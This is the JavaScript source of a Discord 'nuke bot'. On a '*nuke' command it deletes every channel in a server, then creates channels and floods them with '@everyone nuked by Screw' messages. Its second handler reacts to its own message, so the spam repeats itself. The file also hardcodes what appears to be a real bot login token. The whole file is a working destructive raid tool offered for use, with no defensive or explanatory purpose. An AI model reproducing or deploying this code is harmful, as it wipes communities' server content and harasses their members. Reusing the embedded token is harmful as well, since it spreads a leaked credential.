const {
    memberNicknameMention
} = require('@discordjs/builders');
const Discord = require('discord.js');
const client = new Discord.Client({
    intents: [Discord.Intents.FLAGS.GUILDS, Discord.Intents.FLAGS.GUILD_MESSAGES]
});
const {
    MessageEmbed
} = require('discord.js');


client.on('ready', () => {
    console.log('nuke bot is ready')
});


client.on('message', async (message) => {
  if (message.content === '*nuke') {
  message.guild.channels.cache.forEach
        (channel => channel.delete());
 
        await message.guild.channels.create
        ('Bill runs you', {
            type : 'text'
        }).then(async channel=> {
        channel.send('@everyone nuked by Screw ! :flushed:')
        })
    }
})


client.on('message', async (message) => {
    if (message.content === '@everyone nuked by Screw ! :flushed:') {
        await message.guild.channels.create
        ('Screw runs you', {
            type : 'text'
        }).then(async channel=> {
          channel.send('@everyone nuked by Screw ! :flushed:')
        message.channel.send('@everyone nuked by Screw ! :flushed:')
        message.channel.send('@everyone nuked by Screw ! :flushed:')
        message.channel.send('@everyone nuked by Screw ! :flushed:')
        message.channel.send('@everyone nuked by Screw ! :flushed:')
        message.channel.send('@everyone nuked by Screw ! :flushed:')
        message.channel.send('@everyone nuked by Screw ! :flushed:')
        message.channel.send('@everyone nuked by Screw ! :flushed:')
        message.channel.send('@everyone nuked by Screw ! :flushed:')
    })
}
})


client.login("MTI3NjIyNjkzMzc2Nzc5ODg0NA.GXOEN_.GQq6klUQWfmuWwGPZWtEsGp5mvpn33t8KsvH6c");